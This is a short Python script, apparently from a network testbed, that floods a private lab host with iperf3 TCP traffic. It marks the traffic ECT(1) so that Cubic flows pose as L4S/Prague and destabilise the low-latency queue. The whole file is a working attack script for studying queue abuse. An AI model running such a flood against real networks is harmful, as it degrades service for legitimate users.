################################################################################
# Script de Ataque TCP (L4S Fake)
################################################################################
# Funcionalidade:
# - Gera um flood de tráfego TCP usando iperf3.
# - Marca os pacotes com TOS 0x01 (ECT1) para simular tráfego L4S.
# - Tenta saturar a banda competindo com fluxos legítimos.
#
# Diferença do UDP:
# - O TCP é naturalmente responsivo (reduz velocidade com perdas/ECN).
# - Este ataque simula um "Heavy Hitter" TCP que entra na fila L4S (ECT1)
#   mas usa um algoritmo de congestionamento padrão (Cubic) em vez de Prague.
#   Isso causa instabilidade na fila L4S.
################################################################################

import subprocess
import argparse
import sys
import time

# Configurações
TARGET_IP = "192.168.57.10"
TARGET_PORT = 5202 # Porta dedicada para o ataque (para não conflitar com o legítimo na 5201)
DURATION = 1800    # Duração do ataque (30 minutos)

def run_tcp_attack(target_ip, port, duration):
    print(f"[*] Iniciando Ataque TCP L4S (Cubic masquerading as Prague)...")
    print(f"[*] Alvo: {target_ip}:{port}")
    print(f"[*] Duração: {duration}s")
    print(f"[*] TOS: 1 (ECT1)")
    
    # Comando iperf3
    # -c: Client mode
    # -t: Time
    # --tos 1: Define ECN ECT(1)
    # -P 4: 4 fluxos paralelos para tentar ser mais agressivo
    cmd = [
        "iperf3",
        "-c", target_ip,
        "-p", str(port),
        "-t", str(duration),
        "--tos", "1",
        "-P", "4" 
    ]
    
    try:
        # Executa o iperf3 e mostra a saída em tempo real
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        # Lê a saída linha a linha
        for line in process.stdout:
            print(line.strip())
            
        process.wait()
        
        if process.returncode != 0:
            print(f"[ERRO] O iperf3 falhou. Verifique se o servidor está rodando na porta {port}.")
            print(process.stderr.read())
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido.")
        process.terminate()
    except FileNotFoundError:
        print("[ERRO] 'iperf3' não encontrado. Instale com 'sudo apt install iperf3'.")

if __name__ == "__main__":
    run_tcp_attack(TARGET_IP, TARGET_PORT, DURATION)
